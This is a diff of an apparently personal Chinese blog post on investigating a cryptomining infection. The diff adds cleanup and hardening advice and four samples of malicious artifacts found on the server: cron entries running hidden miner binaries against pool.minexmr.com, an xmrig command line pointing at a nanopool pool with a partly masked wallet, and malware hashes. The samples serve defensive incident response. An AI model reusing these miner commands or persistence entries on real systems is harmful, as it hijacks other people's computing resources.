@@ -143,7 +143,11 @@
   <ul>
     <li><a href="#前言">前言</a></li>
     <li><a href="#1分析">1、分析</a></li>
-    <li><a href="#2按步骤排查">2、按步骤排查</a></li>
+    <li><a href="#2按步骤排查">2、按步骤排查</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
     <li><a href="#3整理下一些共性问题">3、整理下一些共性问题</a>
       <ul>
         <li><a href="#31-crontab--l失效">3.1 crontab -l失效</a></li>
@@ -166,6 +170,8 @@
         <li><a href="#43-控制端口">4.3 控制端口</a></li>
         <li><a href="#44-云服务器的云盾产品尽量安装">4.4 云服务器的云盾产品尽量安装</a></li>
         <li><a href="#45-不要图方便直接开公网地址和端口">4.5 不要图方便直接开公网地址和端口</a></li>
+        <li><a href="#46-第三方开源工具需要关注定期升级">4.6 第三方开源工具需要关注，定期升级</a></li>
+        <li><a href="#47-做好网络规划隔离">4.7 做好网络规划隔离</a></li>
       </ul>
     </li>
     <li><a href="#5挖矿病毒的参考">5、挖矿病毒的参考</a></li>
@@ -239,7 +245,7 @@
 <p>1月23日，公司邮箱收到说阿里云报了挖矿病毒的警告</p>
 <h2 id="1分析">1、分析</h2>
 <p>这次思路改进了些，起初有个只是定时任务没被清理，阿里云通过定时任务关键字&quot;pool.minexmr.com:4444&quot;报了蠕虫病毒，但是根据关键字查看，这像挖矿<br>
-然后 top 了半天没看到结果，怀疑是top被篡改了？？？然后进了/usr/bin/核对下 top 的时间，发现没差异呀，但是本着稳妥期间，还是下载 busybox</p>
+然后 top 了半天没看到结果，怀疑是top被篡改了？？？然后进了/usr/bin/核对下 top 的时间，发现没差异呀，但是本着稳妥起见，还是下载 busybox</p>
 <div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
@@ -256,7 +262,98 @@ busybox  top
 </div>
 </div><h2 id="2按步骤排查">2、按步骤排查</h2>
 <p>剩余步骤跟<a href="/post/2021-01-28-miner_virus_2">挖矿病毒2-分析和排查思路</a>一样，只是所有的命令前面是 busybox command</p>
-<h2 id="3整理下一些共性问题">3、整理下一些共性问题</h2>
+<h4 id="查到的一些异常样例">查到的一些异常样例</h4>
+<h4 id="案例1">案例1：</h4>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; cat oracle 
+<span style="color:#099">2</span> * * * * /home/oracle/.dhpcd -o pool.minexmr.com:4444 -t8 --safe -B &gt;/dev/null 2&gt;/dev/null
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="案例2">案例2：</h4>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; cat admin 
+*3 * * * * /var/tmp/.xri/monitor
+
+&gt; ps -auxf | grep admin
+root       <span style="color:#099">746</span>  0.0  0.0 <span style="color:#099">112712</span>   <span style="color:#099">960</span> pts/0    S+   15:56   0:00          <span style="color:#d14">\_</span> grep --color<span style="color:#000;font-weight:bold">=</span>auto admin
+admin     <span style="color:#099">5846</span>  0.0  0.0 <span style="color:#099">113320</span>  <span style="color:#099">1520</span> ?        S     <span style="color:#099">2021</span>  10:28 /bin/bash /dev/shm/.x/scp
+admin      <span style="color:#099">739</span>  0.0  0.0 <span style="color:#099">107956</span>   <span style="color:#099">356</span> ?        S    15:56   0:00  <span style="color:#d14">\_</span> sleep <span style="color:#099">10</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="案例3">案例3：</h4>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; busybox top
+top - 10:20:08 up <span style="color:#099">144</span> days,  9:05,  <span style="color:#099">2</span> users,  load average: 12.07, 12.04, 12.00
+Tasks: <span style="color:#099">295</span> total,   <span style="color:#099">1</span> running, <span style="color:#099">171</span> sleeping,   <span style="color:#099">1</span> stopped,   <span style="color:#099">0</span> zombie
+%Cpu<span style="color:#000;font-weight:bold">(</span>s<span style="color:#000;font-weight:bold">)</span>: 50.2 us,  0.1 sy,  0.0 ni, 49.7 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
+KiB Mem : <span style="color:#099">47886084</span> total, <span style="color:#099">35389780</span> free,  <span style="color:#099">4350740</span> used,  <span style="color:#099">8145564</span> buff/cache
+KiB Swap:   <span style="color:#099">969964</span> total,   <span style="color:#099">969964</span> free,        <span style="color:#099">0</span> used. <span style="color:#099">42956764</span> avail Mem 
+
+  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                                                                                          
+ <span style="color:#099">1505</span> root      <span style="color:#099">15</span>  -5 <span style="color:#099">4970560</span> 1.156g  <span style="color:#099">10548</span> S  <span style="color:#099">1200</span>  2.5  40033,13 xmrig
+
+
+
+&gt; ps -axuf | grep <span style="color:#099">1505</span>
+root     <span style="color:#099">32603</span>  0.0  0.0  <span style="color:#099">14428</span>  <span style="color:#099">1008</span> pts/2    S+   10:21   0:00          <span style="color:#d14">\_</span> grep --color<span style="color:#000;font-weight:bold">=</span>auto <span style="color:#099">1505</span>
+root      <span style="color:#099">1505</span> <span style="color:#099">1155</span>  2.5 <span style="color:#099">4970560</span> <span style="color:#099">1212316</span> pts/1 S&lt;l+  <span style="color:#099">2021</span> 2402005:53      <span style="color:#d14">\_</span> ./xmrig -o xmr-us-east1.nanopool.org:14444 -u *********48Vd2N2gGEUQfCRq4ooQuZGjknDtCdGRDiVEyoHNL5wSevPCmcewry41DtD4d********* -k --coin monero -a rx/0
+
+****替换了钱包地址部分字母
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="案例4">案例4：</h4>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/usr/sbin/kerberods
+恶意文件md5：eec085bae7c4dfcdcb353b095b8375fa
+
+/dev/shm/.x/secure
+恶意文件md5：388826af99f6a6ad3c104959f52ea783
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="3整理下一些共性问题">3、整理下一些共性问题</h2>
 <h3 id="31-crontab--l失效">3.1 crontab -l失效</h3>
 <p>crontab -l查不到但是查看/var/log/cron还是会有挖矿的定时任务<br>
 挖矿病毒的定时任务喜欢藏在/var/spool/cron/这里</p>
@@ -325,6 +422,10 @@ ELF用ida pro 分析下，汇编晦涩难懂，只能提取是否还有价值的
 <p>云盾产品能够多方位检测入侵和病毒，比如通过病毒本体的 hash 值、异常进程、异常cpu 占用率等因素提醒你服务器异常并排查</p>
 <h3 id="45-不要图方便直接开公网地址和端口">4.5 不要图方便直接开公网地址和端口</h3>
 <p>尽量通过堡垒机跳转或者 VPN 跳转，一般应用都是通过 nginx 或者 slb 提供80 443访问的，不会直连服务器，自己方便了，没加固做好防护就是给这些病毒可乘之机</p>
+<h3 id="46-第三方开源工具需要关注定期升级">4.6 第三方开源工具需要关注，定期升级</h3>
+<p>关注第三方开源工具是否存在0day 漏洞等，第三方开源工具的 CVE 带来的危害也很大</p>
+<h3 id="47-做好网络规划隔离">4.7 做好网络规划隔离</h3>
+<p>规划好网络，测试、生产、办公环境等做好虚拟隔离</p>
 <h2 id="5挖矿病毒的参考">5、挖矿病毒的参考</h2>
 <p>挖矿进程——pool.minexmr.com的解决办法1: <a href="https://blog.csdn.net/dot_life/article/details/105480202">https://blog.csdn.net/dot_life/article/details/105480202</a><br>
 挖矿进程——pool.minexmr.com的解决办法2: <a href="https://blog.csdn.net/qq_16845639/article/details/77650271">https://blog.csdn.net/qq_16845639/article/details/77650271</a><br>
